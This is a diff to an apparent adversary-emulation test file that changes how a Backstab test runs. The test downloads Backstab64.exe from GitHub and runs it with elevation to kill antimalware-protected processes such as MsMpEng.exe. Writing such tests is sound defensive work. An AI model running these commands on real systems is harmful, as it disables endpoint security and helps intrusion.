@@ -615,7 +615,6 @@ atomic_tests:
 - name: Kill antimalware protected processes using Backstab
   description: |-
     Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.
-  
     https://github.com/Yaxser/Backstab
   supported_platforms:
   - windows
@@ -630,7 +629,7 @@ atomic_tests:
     prereq_command: if (Test-Path $env:temp\Backstab64.exe) {exit 0} else {exit 1}
     get_prereq_command: Start-BitsTransfer -Source "https://github.com/Yaxser/Backstab/releases/download/v1.0.1-beta/Backstab64.exe" -Destination "$env:temp\Backstab64.exe" -dynamic
   executor:
-    command: 'cd $env:temp\; .\Backstab64.exe -k -n #{process_name}'
+    command: '& $env:temp\Backstab64.exe -k -n #{process_name}'
     name: powershell
     elevation_required: true
   
